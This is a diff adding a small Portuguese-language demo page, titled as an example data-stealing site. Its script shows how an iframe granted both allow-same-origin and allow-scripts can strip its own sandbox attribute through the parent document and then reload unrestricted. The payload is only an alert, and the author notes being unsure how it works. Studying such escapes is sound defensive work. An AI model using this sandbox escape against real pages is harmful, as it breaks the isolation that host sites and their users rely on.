@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Exemplo de site roubador de dados.</h1>
+    <p>Exemplo de extração de dados por meio da combinação de <code><em>allow-same-origin</em></code> com <code><em>allow-scripts</em></code></p>
+    
+    <script>
+        const jaFugi = sessionStorage.getItem('fuga_concluida')
+
+        if(!jaFugi) {
+            const meuIframeNoPai = window.parent.document.querySelector('iframe');
+
+            window.parent.console.log("Status atual do sandbox:", meuIframeNoPai.getAttribute('sandbox'));
+
+            meuIframeNoPai.removeAttribute('sandbox');
+
+            sessionStorage.setItem('fuga_concluida', 'true');
+
+            window.parent.console.log("Sandbox removido! Recarregando para controle total.");
+
+            window.location.reload();
+        } else {
+            window.parent.console.log("Foi");
+            window.parent.alert("Liberdade");
+            sessionStorage.removeItem('fuga_concluida');
+        }
+
+        //Mais ou menos isso, nao peguei muito bem como funciona
+    </script>
+</body>
+</html>
